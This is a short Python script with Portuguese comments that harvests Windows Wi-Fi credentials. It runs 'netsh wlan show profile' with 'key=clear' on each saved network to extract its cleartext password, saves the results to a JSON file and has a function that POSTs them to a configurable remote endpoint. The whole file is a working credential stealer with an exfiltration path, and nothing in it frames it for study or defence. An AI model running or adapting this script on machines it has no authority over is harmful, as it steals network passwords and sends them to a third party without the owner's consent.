import re
import json
import requests
import subprocess

url = '<ENDPOINT>'
save = True
send = False
command = 'netsh wlan show profile'

def get_profiles():
    """ Coleta os perfis salvos no computador """
    profile_list = list()
    profiles = subprocess.run(command, shell=True, capture_output=True).stdout.decode()
    for profile in re.findall(r':\s\w.*', profiles):
        profile_list.append(profile[2:].strip())
    return profile_list
    
def get_passwords(profile_list):
    """ Faz a iteração dos perfis para coletar as senhas """
    info = dict()
    protegido = dict()
    livre = list()
    for ssid in profile_list:
        password = subprocess.run(f'{command} "{ssid}" key=clear', shell=True, capture_output=True).stdout.decode()
        try:
            pwd = re.search('da Chave.*', password).group().strip()
            pwd = pwd[pwd.index(':')+2:]
            protegido[ssid] = pwd
        except:
            livre.append(ssid)
    info["quantidade"] = {"livre": len(livre), "protegido": len(protegido), "total": len(protegido) + len(livre)}
    info["protegido"] = protegido
    info["livre"] = livre
    return info

def save_results(info):
    """ Salva as informações em formato json """
    with open('Senhas_Wi-fi.json', 'w') as wifi_pwds:
        json.dump(info, wifi_pwds, indent=4)

def send_results(info):
    """ Envia o resultado para algum endpoint indicado pelo usuário """
    data = {"results": info}
    response = requests.post(url, json=data)
    return response

if __name__ == '__main__':
    print("\n[*] Coletando perfis...")
    profile_list = get_profiles()
    print("[+] Perfis coletados...")
    print("[*] Coletando senhas...")
    info = get_passwords(profile_list)
    print("[+] Senhas coletadas...")
    if save:
        print("\n[*] Salvando...")
        save_results(info)
        print("[+] Salvo...")
    if send and url:
        print("\n[*] Enviando resultados...")
        response = send_results(info)
        if response:
            print("[*] Status code: {}".format(response))
            if response.status_code == 200:
                print("[+] Enviado...")
            else:
                print("[-] Ocorreu algum erro: {}".format(response.text))
    print("\n[*] Finalizado...\n")